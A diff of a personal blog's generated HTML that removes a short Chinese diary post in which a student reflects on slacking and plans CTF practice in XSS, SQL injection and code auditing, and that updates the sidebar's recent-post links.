-    <a href="/2023/03/17/water/" class="article-date">
-  <time datetime="2023-03-17T15:36:25.000Z" itemprop="datePublished">2023-03-17</time>
-</a>
-    
-  </div>
-  <div class="article-inner">
-    
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="article-title" href="/2023/03/17/water/">水</a>
-    </h1>
-  
-
-      </header>
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-        <p>之前的博客懒得搬了（）：<a target="_blank" rel="noopener" href="http://www.yuque.com/mytte">http://www.yuque.com/mytte</a></p>
-<p>好像自开学以来一直摸鱼没干啥事，想要在周末强迫自己干点事难度挺大<br>感觉落后了进度不少，在之前新生赛的尝试中发现对于xss和sql的掌握并<br>不咋样，而且脑子太公式化了</p>
-<p>上周重试了xss-lab，但是这个练习好像更集中于绕过，对于自己不熟悉的<br>外带以及注入点发现啥的帮助似乎不大</p>
-<p>周末再试下sql-lab，不然还是不太懂实操上要注入啥</p>
-<p>前几天在那个之前的比赛群里看到了个招聘公告，想起来还有代码审计的书<br>被落下了</p>
-<p>emm在BUUctf找些简单的试下再去试群里的题，就先这样了</p>
-
-      
-    </div>
-    <footer class="article-footer">
-      <a data-url="http://example.com/2023/03/17/water/" data-id="clk6k5tlm00072gudg330c4yu" class="article-share-link">Share</a>
-      
-      
-    </footer>
-  </div>
-  
-</article>
-
-
-  
 
 
   <nav id="page-nav">
@@ -668,6 +716,10 @@ sql99优点：表连接的条件是独立的，连接之后，如果还需要进
       <ul>
         
           <li>
+            <a href="/2023/07/21/xsslab/">2023/7/21：夏令营week2记录:xsslab</a>
+          </li>
+        
+          <li>
             <a href="/2023/07/16/week1plus/">2023/07/15：夏令营week1记录:出题</a>
           </li>
         
@@ -681,10 +733,6 @@ sql99优点：表连接的条件是独立的，连接之后，如果还需要进
         
           <li>
             <a href="/2023/04/28/warmup/">2023/04/18：FCTF2023：warmup&amp;正式比赛</a>
-          </li>
-        
-          <li>
-            <a href="/2023/04/27/aaaa/">2023/04/15：burplabs从0开始</a>
           </li>
         
       </ul>
